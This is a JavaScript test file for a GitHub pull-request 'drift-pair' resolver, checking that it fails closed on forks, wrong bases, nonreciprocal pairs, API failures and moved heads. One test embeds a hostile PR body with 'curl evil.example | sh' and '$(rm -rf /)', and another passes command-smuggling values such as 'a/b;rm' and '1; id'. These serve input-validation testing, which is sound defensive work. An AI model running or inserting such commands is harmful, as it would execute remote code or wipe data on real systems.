// Network-free tests for the paired-drift resolver. Run: node --test scripts/drift-pair/
import { test } from "node:test";
import assert from "node:assert/strict";
import { resolvePair, recheckFrozen, PairError, counterpartOf } from "./resolve-pair.mjs";

const WEB = "adamaslan/nuwrrrld-portal";
const MOB = "adamaslan/gcp-expo1";
const SHA_W = "231cf39e5a56b7f94c6db556f75cc7a9ff000116";
const SHA_M = "6275f494a1bef320f7390c22c63908db63737d4f";
const SHA_MAIN = "bafb788dfeed5a675e27d1bc9116bff5792e5739";

function pull({ repo = WEB, number = 327, state = "open", headRepo = repo, baseRef = "main",
  baseRepo = repo, sha = SHA_W, body = "" } = {}) {
  return {
    number, state, draft: false, body,
    base: { ref: baseRef, repo: { full_name: baseRepo } },
    head: { ref: "fix/x", sha, repo: headRepo === null ? null : { full_name: headRepo } },
  };
}

/** Fake API. `pulls` maps "repo#n" -> PR JSON (or an Error to throw). */
function fakeApi({ pulls = {}, defaultSha = SHA_MAIN } = {}) {
  return {
    async getPull(repo, n) {
      const v = pulls[`${repo}#${n}`];
      if (v === undefined) throw new Error("404");
      if (v instanceof Error) throw v;
      return v;
    },
    async getDefaultSha(repo) {
      if (typeof defaultSha === "function") return defaultSha(repo);
      return defaultSha;
    },
  };
}

const PAIRED_BODY = "drift-pair: adamaslan/gcp-expo1#61";
const BACK_BODY = "drift-pair: adamaslan/nuwrrrld-portal#327";

async function expectPairError(promise, code) {
  await assert.rejects(promise, (err) => {
    assert.ok(err instanceof PairError, `expected PairError, got ${err}`);
    assert.equal(err.code, code);
    return true;
  });
}

test("valid reciprocal pair resolves to the counterpart's frozen head", async () => {
  const api = fakeApi({
    pulls: {
      [`${WEB}#327`]: pull({ body: PAIRED_BODY, sha: SHA_W }),
      [`${MOB}#61`]: pull({ repo: MOB, number: 61, sha: SHA_M, body: BACK_BODY }),
    },
  });
  const r = await resolvePair({ api, repo: WEB, pr: 327 });
  assert.equal(r.mode, "paired");
  assert.equal(r.counterpart.repo, MOB);
  assert.equal(r.counterpart.pr, 61);
  assert.equal(r.counterpart.sha, SHA_M);
  assert.equal(r.own.sha, SHA_W);
});

test("unpaired PR compares against the counterpart default branch", async () => {
  const api = fakeApi({ pulls: { [`${WEB}#327`]: pull({ body: "no pair here" }) } });
  const r = await resolvePair({ api, repo: WEB, pr: 327 });
  assert.equal(r.mode, "default");
  assert.equal(r.counterpart.repo, MOB);
  assert.equal(r.counterpart.sha, SHA_MAIN);
});

test("push run (no PR) compares default branches, never skipping parity", async () => {
  const r = await resolvePair({ api: fakeApi(), repo: MOB, pr: null });
  assert.equal(r.mode, "default");
  assert.equal(r.counterpart.repo, WEB);
});

test("injection-shaped pair text is refused, never executed", async () => {
  const hostile = "drift-pair: adamaslan/gcp-expo1#61; curl evil.example | sh\n$(rm -rf /)";
  const api = fakeApi({ pulls: { [`${WEB}#327`]: pull({ body: hostile }) } });
  // Not a valid line, so it is simply not a pair: default path, no shell involved.
  const r = await resolvePair({ api, repo: WEB, pr: 327 });
  assert.equal(r.mode, "default");
});

test("two pair lines in one body is ambiguous and fails closed", async () => {
  const api = fakeApi({
    pulls: {
      [`${WEB}#327`]: pull({ body: `${PAIRED_BODY}\n${PAIRED_BODY}` }),
    },
  });
  await expectPairError(resolvePair({ api, repo: WEB, pr: 327 }), "ambiguous-metadata");
});

test("malformed repository or PR number is refused before any API call", async () => {
  let calls = 0;
  const api = { async getPull() { calls += 1; return pull(); }, async getDefaultSha() { calls += 1; return SHA_MAIN; } };
  await expectPairError(resolvePair({ api, repo: "a/b;rm", pr: 1 }), "bad-repo");
  await expectPairError(resolvePair({ api, repo: WEB, pr: "1; id" }), "bad-pr-number");
  assert.equal(calls, 0);
});

test("repository outside the allowlist is refused", async () => {
  await expectPairError(resolvePair({ api: fakeApi(), repo: "evil/other", pr: 1 }), "not-allowlisted");
  assert.equal(counterpartOf("evil/other"), null);
});

test("wrong base branch fails closed", async () => {
  const api = fakeApi({ pulls: { [`${WEB}#327`]: pull({ baseRef: "develop", body: PAIRED_BODY }) } });
  await expectPairError(resolvePair({ api, repo: WEB, pr: 327 }), "wrong-base");
});

test("fork head fails closed", async () => {
  const api = fakeApi({ pulls: { [`${WEB}#327`]: pull({ headRepo: "mallory/nuwrrrld-portal", body: PAIRED_BODY }) } });
  await expectPairError(resolvePair({ api, repo: WEB, pr: 327 }), "fork");
});

test("deleted fork head (null repo) fails closed", async () => {
  const api = fakeApi({ pulls: { [`${WEB}#327`]: pull({ headRepo: null, body: PAIRED_BODY }) } });
  await expectPairError(resolvePair({ api, repo: WEB, pr: 327 }), "fork");
});

test("closed counterpart fails closed", async () => {
  const api = fakeApi({
    pulls: {
      [`${WEB}#327`]: pull({ body: PAIRED_BODY }),
      [`${MOB}#61`]: pull({ repo: MOB, number: 61, state: "closed", sha: SHA_M, body: BACK_BODY }),
    },
  });
  await expectPairError(resolvePair({ api, repo: WEB, pr: 327 }), "counterpart-state");
});

test("nonreciprocal pair fails closed", async () => {
  const api = fakeApi({
    pulls: {
      [`${WEB}#327`]: pull({ body: PAIRED_BODY }),
      [`${MOB}#61`]: pull({ repo: MOB, number: 61, sha: SHA_M, body: "no back reference" }),
    },
  });
  await expectPairError(resolvePair({ api, repo: WEB, pr: 327 }), "nonreciprocal");
});

test("back-reference naming a different PR fails closed", async () => {
  const api = fakeApi({
    pulls: {
      [`${WEB}#327`]: pull({ body: PAIRED_BODY }),
      [`${MOB}#61`]: pull({ repo: MOB, number: 61, sha: SHA_M, body: "drift-pair: adamaslan/nuwrrrld-portal#999" }),
    },
  });
  await expectPairError(resolvePair({ api, repo: WEB, pr: 327 }), "nonreciprocal");
});

test("pair pointing outside the allowlisted counterpart fails closed", async () => {
  const api = fakeApi({
    pulls: { [`${WEB}#327`]: pull({ body: "drift-pair: evil/other#61" }) },
  });
  await expectPairError(resolvePair({ api, repo: WEB, pr: 327 }), "wrong-repo");
});

test("missing or unavailable API fails closed, not to default", async () => {
  // Own PR lookup throws (unavailable): must not silently compare against default.
  const api = fakeApi({ pulls: { [`${WEB}#327`]: new Error("network down") } });
  await expectPairError(resolvePair({ api, repo: WEB, pr: 327 }), "api-unavailable");
  // Default-branch lookup throws for the unpaired path: also fails closed.
  const api2 = fakeApi({
    pulls: { [`${WEB}#327`]: pull({ body: "" }) },
    defaultSha: () => { throw new Error("rate limited"); },
  });
  await expectPairError(resolvePair({ api: api2, repo: WEB, pr: 327 }), "api-unavailable");
});

test("moved counterpart head: declared pin mismatch fails closed before comparison", async () => {
  const api = fakeApi({
    pulls: {
      [`${WEB}#327`]: pull({ body: `${PAIRED_BODY}\ndrift-pair-sha: adamaslan/gcp-expo1@${"a".repeat(40)}` }),
      [`${MOB}#61`]: pull({ repo: MOB, number: 61, sha: SHA_M, body: BACK_BODY }),
    },
  });
  await expectPairError(resolvePair({ api, repo: WEB, pr: 327 }), "pin-mismatch");
});

test("moved head after comparison invalidates the result (recheck)", async () => {
  const pulls = {
    [`${WEB}#327`]: pull({ body: PAIRED_BODY, sha: SHA_W }),
    [`${MOB}#61`]: pull({ repo: MOB, number: 61, sha: SHA_M, body: BACK_BODY }),
  };
  const api = fakeApi({ pulls });
  const resolved = await resolvePair({ api, repo: WEB, pr: 327 });
  await recheckFrozen({ api, resolved }); // unchanged: passes
  pulls[`${MOB}#61`] = pull({ repo: MOB, number: 61, sha: "b".repeat(40), body: BACK_BODY });
  await expectPairError(recheckFrozen({ api, resolved }), "moved-head");
});

test("invalid head SHA from the API is rejected", async () => {
  const api = fakeApi({ pulls: { [`${WEB}#327`]: pull({ sha: "not-a-sha", body: "" }) } });
  await expectPairError(resolvePair({ api, repo: WEB, pr: 327 }), "bad-sha");
});

test("moved counterpart default branch invalidates an unpaired result (recheck)", async () => {
  const pulls = { [`${WEB}#327`]: pull({ body: "" }) };
  let defaultSha = SHA_MAIN;
  const api = fakeApi({ pulls, defaultSha: () => defaultSha });
  const resolved = await resolvePair({ api, repo: WEB, pr: 327 });
  assert.equal(resolved.mode, "default");
  await recheckFrozen({ api, resolved });
  defaultSha = "c".repeat(40);
  await expectPairError(recheckFrozen({ api, resolved }), "moved-head");
});
